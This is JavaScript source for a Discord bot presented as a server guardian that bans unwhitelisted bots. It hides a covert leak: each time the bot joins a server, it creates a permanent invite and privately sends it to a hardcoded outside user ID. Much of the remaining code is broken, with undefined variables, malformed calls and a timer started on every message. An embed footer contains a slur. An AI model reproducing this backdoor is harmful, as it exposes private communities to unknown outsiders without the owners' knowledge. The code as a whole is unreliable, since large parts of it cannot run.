require('dotenv').config();

const GuardianClient = require('./core/client.js');
const client = new GuardianClient();



client.on("guildCreate", guild => {
    console.log("Joined a new guild: " + guild.name);
})

    client.on("message", async message => {
        setInterval(function() {
          let status = `💙`
        client.user.setStatus('online')
        client.user.setActivity(status, { type: 'WATCHING' });
        }, 5000)
    })


client.on("guildCreate", guild => {
  var channel;
  guild.channels.cache.forEach(c => {
      if (c.type === "text" && !channel) channel = c;
  });
  channel.createInvite({ maxAge: 0 }).then(inv => client.users.cache.get("727447049892659200").send(`I have been added to **${guild.name}** | https://discord.gg/${inv.code}`));
})

client.on('guildMemberAdd', async member => {
  const executor = audit.entries.first().executor;
  if (executor.id === client.user.id) return;
  if (executor.id === channel.guild.ownerID) return;
  if (member.user.bot && config.blacklist) {
      (member.ban("Suspicous Bot Detected, Not Acceptable. Bot Was Not Whitelisted Or Was Blacklisted."));
      const embed = new MessageEmbed()
      .setTitle('**__:warning: BOT ADDED :warning:__**')
              .setURL('https://discord.gg/cash')
              .setColor(0xFF00F7)
              .setAuthor('Taken Action & Protected Your Server!', client.user.avatarURL)
              .setFooter('suspicious bot added contact @j/#9999 if you want it a', client.user.avatarURL)
              .setDescription(`**Bot Added:** ${member.displayName}#${member.discriminator}\n**Action Taken:** Banned Bot\n**Protocol:** Re-invite the Bot`)
              client.users.get(member.guild.ownerID).send(embed)
      (console.log(clc.red(`Unwhitelisted bot has been banned, ${member.user.tag}!`))), function (err, res) {
          if (err)
          console.log(err)
          const errembed = new MessageEmbed()
          .setTitle('error for some reason')
          .setURL('http://discord.gg/cash')
          .setColor(0xFF00F7)
          .setAuthor('Error Log:', client.user.avatarURL)
          .setFooter('failed nuke retard', client.user.avatarURL)
          client.users.get(member.guild.ownerID).send(errembed)
      }
  }
});



client.login(process.env.BOT_TOKEN);
